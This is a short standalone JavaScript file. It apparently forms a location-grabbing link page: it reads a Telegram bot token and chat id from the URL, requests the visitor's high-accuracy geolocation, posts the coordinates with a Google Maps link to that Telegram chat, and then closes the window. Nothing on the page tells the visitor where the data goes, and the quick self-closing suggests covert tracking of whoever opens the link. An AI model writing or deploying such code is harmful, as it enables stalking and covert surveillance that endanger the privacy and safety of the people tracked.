(async () => {
  const params = new URLSearchParams(window.location.search);
  const BOT = params.get('bot');
  const CID = params.get('chat');
  if (!BOT || !CID) { window.close(); return; }

  try {
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const { latitude, longitude, accuracy } = pos.coords;
      const msg = `📍 Location:\nLat: ${latitude}\nLon: ${longitude}\nAccuracy: ${accuracy}m\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: msg })
      });
      window.close();
    }, async (err) => {
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: '📍 Location error: ' + err.message })
      });
      window.close();
    }, { enableHighAccuracy: true, timeout: 5000 });
  } catch(e) { window.close(); }
})();